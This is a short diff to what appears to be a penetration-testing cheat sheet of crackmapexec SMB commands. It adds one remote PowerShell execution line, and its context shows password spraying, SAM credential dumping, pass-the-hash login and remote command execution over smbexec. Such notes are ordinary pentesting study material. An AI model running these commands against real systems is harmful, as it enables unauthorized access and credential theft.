@@ -277,6 +277,7 @@ $ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>'
 $ crackmapexec smb <IP address> -u <usernames.txt> -p '<password>' --local-auth
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec smb <IP address> -u <username> -p '<password>' -x 'whoami' --exec-method smbexec
+$ crackmapexec smb <IP address> -u <username> -p '<password>' -X 'Get-Process' --exec-method smbexec
 $ crackmapexec smb <CIDR IP address> -u <username> -p '<password>' --loggedon-users
 $ crackmapexec smb <IP address> -u <username> -p '<password>' --sam
 $ crackmapexec smb <IP address> -u <username> -H <hash>
